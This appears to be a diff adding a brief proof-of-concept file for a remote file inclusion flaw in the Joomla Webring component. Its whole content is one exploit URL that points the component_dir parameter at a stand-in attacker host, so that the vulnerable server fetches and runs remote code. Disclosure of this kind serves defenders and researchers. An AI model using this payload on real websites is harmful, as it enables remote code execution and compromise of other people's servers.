@@ -1,0 +1,7 @@
+# Joomla Webring Remote File Include Proof of Concept
+####################################################
+
+Exploit:
+http://www.example.com/[path]/administrator/components/com_webring/admin.webring.docs.php?component_dir=http://evil_scripts?
+
+####################################################
